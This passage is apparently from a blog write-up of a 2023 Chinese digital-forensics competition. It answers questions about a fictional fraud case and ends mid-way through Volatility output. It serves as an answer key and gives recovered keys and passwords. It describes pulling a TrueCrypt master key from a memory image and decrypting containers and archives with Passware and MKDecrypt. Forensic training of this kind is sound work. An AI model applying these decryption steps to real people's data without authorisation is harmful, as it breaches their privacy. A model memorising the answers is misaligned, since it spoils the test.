src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/18.png" alt="18"></p><p><strong>19.苹果手机备份密码的前四位是</strong></p><p>1976</p><p><strong>20.魏文茵的苹果手机IMEI是</strong></p><p>这回火眼能用了hhh</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/20.png" alt="20"></p><p><strong>21.魏文茵可能使用过的手机号不包括#</strong></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/21-1.png" alt="21-1"></p><p>不知道为什么只搜到了1和3是用过的</p><p><strong>22臧觅风的微信ID</strong></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/22.png" alt="22"></p><p><strong>23臧觅风在什么地方使用过交友软件</strong></p><p>要放开思路，他的交友APP不一定直接显示登陆地点，但是他使用APP的时间可以和其他信息关联起来推断所在地，比如说照片</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/23-1.png" alt="23-1"></p><p>臧在4月12日九时左右使用交友软件疑似要果聊或者月抛，但是探探和其他软件均未显示其地点信息，但是在相册可以发现晚上8：40左右拍摄的照片</p><p>因此根据照片推断人在西安</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/23.png" alt="23"></p><p><strong>24.臧在购买源码的账户是？</strong></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/24.png" alt="24"></p><p>5768224669</p><p>25臧购买源码花费多少BTC？</p><p>最后成交价0.08</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/25.png" alt="25"></p><p><strong>26接受源码的邮箱是？</strong></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/26.png" alt="image-20240927173809167"></p><p>molihuacha0072hotmail.com</p><p><strong>27.容恨寒苹果手机的IMEI？</strong></p><p><strong>29容恨寒微信的ID？</strong></p><p>检材清单中并没有提到容恨寒有苹果手机，只说了他有坚果pro3和一个macbook，因此合理推断他的苹果手机在电脑里面有备份，备份密码前面有提到过，但是不知道为什么我的数据库没有完整的密码，问了别人说他们的数据库直接可以找到是19760908，因此这里直接将备份文件作为新的检材让火眼分许，输入备份密码，最后可以找到IMEI和微信ID</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/27.png" alt="27"></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/29.png" alt="29"></p><p><strong>28.问容恨寒苹果手机“易信”的唯一标识符</strong></p><p>这个指的是，容恨寒的苹果在登录易信的时候，易信给苹果手机分配的，用来标识它的唯一标识符，在文件系统中搜索yixin</p><p>在login_device_id_v1这里可以看到</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/28.png" alt="28"></p><p><strong>30.嫌疑人魏文茵计算机操作系统版本</strong></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/30.png" alt="30"></p><p>按照答案的格式，应该是Windows 10 Professional 14393，14393是build版本号，后面的2189则是修订号</p><p><strong>31.默认浏览器是</strong></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/31.png" alt="31"></p><p>Google Chrome</p><p><strong>32.以下哪个不是嫌疑人最近打开的文档</strong></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/32.png" alt="32"></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/32-1.png" alt="32-1"></p><p>掠夺攻略，选1</p><p><strong>33.魏文茵电脑有几个加密分区</strong></p><p>1个</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/33.png" alt="33"></p><p><strong>34魏文茵装了什么第三方加密软件</strong></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/image-20240927214906389.png" alt="image-20240927214906389"></p><p>仿真之后看了只有truecrypt，vera找不到</p><p><strong>35TrueCrypt的加密容器是哪个？</strong></p><p>这里火眼分析不出来，但是看文件的大小可以发现，Users&#x2F;Documents下的《穿越六十年代小知青》这个txt大小不正常，足有1G左右，因此就是它了</p><p><strong>36BitLocker密钥是</strong></p><p>这个要用取证大师搜索原始检材的功能，笔者没有license</p><p>答案放这里</p><p>000649-583407-395868-441210-589776-038698-479083-651618</p><p><strong>37.攻略.docx有几种诈骗方式</strong></p><p>38种</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/37.png" alt="37"></p><p><strong>38华中组的诈骗收益</strong></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/38.png" alt="38"></p><p>100万</p><p><strong>39.魏文茵电脑的print.exe的PID</strong></p><p>这个用火眼自带的内存分析工具，是728</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/39.png" alt="39"></p><p><strong>40.臧觅风电脑E01检材的SHA-1</strong></p><p>813fc904eca559b2dcfce2802ae87e013daaa81f</p><p><strong>41.臧觅风电脑的总扇区数</strong></p><p>火眼没有计算扇区的功能，用取证大师看是536,870,912</p><p><strong>42哪个文件不是技术员用浏览器下载的</strong></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/42.png" alt="42"></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/42-1.png" alt="image-20240928193041841"></p><p>4不是</p><p><strong>43好东西.zip的解压密码是？</strong></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/43.png" alt="image-20240928194723485"></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/43-1.png" alt="43-1"></p><p>打开臧觅风的手机检材，微信账号处获取其手机号信息</p><p><strong>44.臧觅风曾经远程连master.k8s.com，端口是？</strong></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/44.png" alt="44"></p><p>搜索域名，发现臧用VanDyke连接，该文件夹下都是远程连接的配置文件，找到这个域名的，端口为000008ea，转成十进制是2282</p><p><strong>45接着上题，问服务器的密码</strong></p><p>这个在账号密码.doc文件里，老实说，我以为是要接着推断上图Password的算法，解密，谁知道在这里</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/45.png" alt="45"></p><p><strong>46.臧的电脑有了装了各种各样密码的txt，计算MD5</strong></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/46.png" alt="46"></p><p>c1934045c3348ea1ba618279aac38c67</p><p><strong>47.臧的计算机使用过反取证技术，指出加密容器的盘符</strong></p><p>仿真后在D盘找到了一个5g大小的word”资料.doc”，这个就是容器了，在火眼里搜索容器发现</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/47.png" alt="47"></p><p>合理推测这个doc挂过F盘；</p><p><strong>48.臧的计算机keepass的master password是什么？</strong></p><p>keepass是密码管理器，而master password是进入keepass用的密码；</p><p>上一题提到了容器，新知识点，<strong>passware可以用来解密bitlocker和加密容器，</strong></p><p><strong>直接加载内存镜像到passware，然后passware会将容器变成未保护状态，将其加载到火眼，以镜像文件的形式</strong>，翻找得到</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/48.png" alt="48"></p><p>这题补充一些东西：1.passware在全盘加密那里加载内存镜像然后解密容器，建议改后缀为.tc</p><p>2.这题也可以用volatility2完成</p><p>首先：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f memoryfile --profile=correct_profile truecryptmaster -D ./</span><br></pre></td></tr></table></figure><p>这个实际上利用了truecrypt的一个漏洞，就是主密钥必须存在RAM中</p><p>获取主密钥文件后，用MKDecrypt挂载解密tc容器，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python MKDecrypt.py -m mounting_point -X encrypted_tc_container master_key</span><br></pre></td></tr></table></figure><p>挂载点一般在&#x2F;mnt&#x2F;目录之下，可以自己创一个，不想挂载了就回车取消</p><p>3.如果想挂载到windows，用xwf先将镜像转换为磁盘，在专业工具栏，然后再用ftk挂载</p><p><strong>49.臧的电脑用的爬虫软件叫什么</strong></p><p>后羿采集器</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86" alt="48">&#x2F;48.png</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/49.png" alt="49"></p><p><strong>50.臧用采集器猜了多少人的数据？</strong></p><p>这里没做出来，臧觅风用采集器采集数据后用Potato发给了容恨寒</p><p>文件都在坚果pro3\storage\emulated\0\Android\data\com.qim.imm\files\Potato\Attachment里</p><p><strong>51以下哪个是不使用采集器采集的信息</strong></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/51.png" alt="51"></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/51-1.png" alt="51-1"></p><p>答案是3</p><p><strong>53接上题，臧觅风一共采集了多少条人员数据？</strong></p><p>依照上图逐个表统计有</p><p>100+17+18970+96+29+16&#x3D;19228</p><p><strong>54臧的计算机曾经访问阿里云的webdav，端口是？</strong></p><p>webdav相当于一个虚拟的文件系统，基于HTTP 1.1</p><p>首先搜索webdav，搜到了其ip地址；然后以ip为线索继续找，找到了端口</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/54-1.png" alt="54-1"></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/54-2.png" alt="54-2"></p><p>55.臧的计算机的代理软件的端口是？</p><p>7890<img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/55.png" alt="image-20240930145044421"></p><p><strong>56.接上题，代理软件订阅的token是什么？</strong></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/56.png" alt="56"></p><p><strong>57内部通联工具的地址和端口：</strong></p><p>首先，手机部分分析可知，通联工具为potato；</p><p>题目的地址是这样的意思:Potato这个软件的公共群组功能是通过发布链接并登陆链接的形式实现的</p><p>所以我们找这个链接，在臧的电脑potato的设置就有</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/57.png" alt="57"></p><p><strong>58.内存镜像的创建时间（北京时间）？</strong></p><p>首先<img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/58.png" alt="58"></p><p>创建系统时间给了，但是这个是utc时间；北京时间是utc+8所以09改成17</p><p><strong>59.哪个不是chrone.exe的动态链接库？</strong></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/59-1.png" alt="59-1"></p><p>一开始以为是题目错误，找了半天。。。</p><p>这个直接在内存分析可以看到<img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/59-2.png" alt="59-2"></p><p>60</p><p><strong>61.“账号信息.docx”的最后访问时间？</strong></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/61.png" alt="61"></p><p><strong>62.61中文档的储存路径是？</strong></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/62.png" alt="62"></p><p><strong>63.容恨寒苹果电脑操作系统版本是？</strong></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/63.png" alt="63"></p><p>12.6</p><p><strong>64操作系统的安装时间是？</strong></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/64.png" alt="image-20241019085146464"></p><p><strong>65.内核版本是？</strong></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/65.png" alt="65"></p><p><strong>66.电脑中正在运行的后台程序的数量</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux|wc -l</span><br></pre></td></tr></table></figure><p>表示以用户有好的形式列出所有没有终端控制的进程（后台进程），统计行数，注意，去掉标题，减去1</p><p>284</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/66.png" alt="66"></p><p><strong>67.容的电脑最后一次关机时间是？</strong></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/67.png" alt="67"></p><p>这里要注意了，这个登陆时间是基于用户显示的时间，是utc+8，gmt是utc+0所以减去8h，跟内存那个题的系统时间是不一样的；</p><p><strong>68.嫌疑人执行过多少次查询主机的命令？</strong><br><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/68.png" alt="68"></p><p><strong>69.陆文杰提现了多少钱？</strong></p><p>首先我们在apple桌面发现了华南流水的rar，估计陆文杰的信息就在这里，但是加密了</p><p>之前提到的密码规则在这里适用，但是不知道为什么archpr不行，那就用passware看看</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/69.png" alt="image-20241019104504478"></p><p>解密后打开xlsx</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/69-2.png" alt="image-20241019104631724"></p><p>答案为10</p><p><strong>70.容恨寒上午上班时长</strong></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/70.png" alt="image-20241019104855306"></p><p>3.5小时</p><p><strong>71.万便的邮箱</strong></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/71.png" alt="71"></p><p><strong>72.容恨寒小孩的年龄是？</strong></p><p>电脑废纸篓有一个八年级奥数教程，所以是14岁</p><p><strong>补充：\REGISTRY\MACHINE\SYSTEM在内存镜像中的地址是？</strong></p><p>这个是属于注册表的，所以用volatility的hivelist</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ vol.py -f memdump.mem --profile=Win10x64_14393 hivelist             </span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Virtual            Physical           Name</span><br><span class="line">------------------ ------------------ ----</span><br><span class="line">0xffffab86220c9000 0x00000000155d0000 \??\C:\Users\WH\AppData\Local\Packages\Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy\Settings\settings.dat</span><br><span class="line">0xffffab8622182000 0x0000000077211000 \??\C:\Users\WH\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\Settings\settings.dat</span><br><span class="line">0xffffab8623aab000 0x000000004405b000 \SystemRoot\System32\config\DRIVERS</span><br><span class="line">0xffffab8619632000 0x0000000058494000 [no name]</span><br><span class="line">0xffffab861963e000 0x00000000584a1000 \REGISTRY\MACHINE\SYSTEM</span><br><span class="line">0xffffab8619678000 0x0000000025802000 \REGISTRY\MACHINE\HARDWARE</span><br><span class="line">0xffffab861b458000 0x000000006d503000 \Device\HarddiskVolume1\Boot\BCD</span><br><span class="line">0xffffab8619ffd000 0x000000005df55000 \SystemRoot\System32\Config\SOFTWARE</span><br><span class="line">0xffffab861a407000 0x000000003faa9000 \SystemRoot\System32\Config\SAM</span><br><span class="line">0xffffab861a178000 0x0000000013bca000 \SystemRoot\System32\Config\SECURITY</span><br><span class="line">0xffffab861a41c000 0x000000005b413000 \SystemRoot\System32\Config\DEFAULT</span><br><span class="line">0xffffab86200b0000 0x0000000009e19000 